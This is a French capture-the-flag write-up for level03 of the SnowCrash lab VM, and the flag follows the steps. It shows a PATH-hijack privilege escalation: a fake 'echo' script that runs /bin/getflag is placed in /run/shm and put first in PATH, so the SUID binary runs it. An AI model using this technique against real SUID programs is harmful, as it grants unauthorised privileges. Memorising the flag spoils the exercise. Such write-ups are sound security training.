## LEVEL03

- Dans ce level, un binaire présent dans le home de level03 se nomme également `level03`.  
En l’exécutant, on obtient :
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```
En faisant un ls -l : 

```bash
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

On remarque que le bit SUID est activé (s à la place du x pour l’utilisateur).
Le propriétaire du fichier est flag03, ce qui signifie que le programme s’exécute avec les droits de flag03, quel que soit l’utilisateur qui le lance..

En inspectant les chaînes visibles dans le binaire, on observe la ligne suivante : /usr/bin/env echo Exploit me  

env lance une commande en la recherchant dans le PATH, sans utiliser de chemin absolu.
Le système parcourt donc les dossiers du PATH dans l’ordre et exécute le premier echo trouvé.

L’objectif est donc de fournir notre propre binaire/script nommé echo, placé dans un dossier contrôlé par level03, et de faire en sorte que ce dossier soit en tête du PATH.

## EXPLOITATION

1. On cree notre script echo
```bash
#!/bin/sh
/bin/getflag
```
2. On le deplace du host vers la VM dans un dossier ou level03 a les droits r et w, par exemple /run/shm

```bash
scp -P 4242 echo level03@192.168.56.13:/run/shm
```

3. Rendre le script exécutable :
```bash
chmod +x /run/shm/echo

```

4. Modifier le PATH pour que /run/shm soit prioritaire :
```bash
export PATH=/run/shm:$PATH
```
5. Exécuter le binaire level03

## FLAG 

- qi0maab88jeaj46qoumi7maus
